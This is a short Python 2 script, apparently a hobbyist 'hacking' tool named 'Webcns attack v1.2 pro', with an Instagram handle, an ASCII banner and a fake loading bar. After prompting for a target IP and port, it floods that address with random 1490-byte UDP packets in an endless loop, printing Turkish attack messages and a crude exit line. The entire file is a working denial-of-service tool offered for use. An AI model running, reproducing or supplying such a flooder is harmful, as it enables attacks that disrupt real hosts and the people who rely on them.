# -*- coding: utf-8 -*-

from time import sleep
import os, socket, random, sys

os.system("clear")
print ("\033[1;36mInstagram:hackin50tonu\n")

print("""
              _                    
             | |                   
__      _____| |__   ___ _ __  ___ 
\ \ /\ / / _ \ '_ \ / __| '_ \/ __|
 \ V  V /  __/ |_) | (__| | | \__ \
  \_/\_/ \___|_.__/ \___|_| |_|___/                                                
""")
print("\033[1;36mWebcns attack v1.2 pro\n")

ip = raw_input("\033[1;36mIp: ")
port = int(input("\033[1;36mPort: "))

os.system("clear")
print("[>                   ] 0%")
sleep(0.25)
os.system("clear")
print("[=====>              ] 25%")
sleep(0.25)
os.system("clear")
print("[==========>         ] 50%")
sleep(0.25)
os.system("clear")
print("[===============>    ] 75%")
sleep(0.25)
os.system("clear")
print("[====================] 100%")
sleep(0.25)
os.system("clear")

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
sent = 1

while True:
	try:
		sock.sendto(bytes, (ip, port))
		print("\033[1;31m[*] %s -> %s:%s (Yerlestirilen IP'adresine saldırılıyor)" %(sent, ip, port))
		sent = sent + 1
	except KeyboardInterrupt:
		print("\033[1;36m\n\Gitmek istiyorsan siktir git.")
		exit()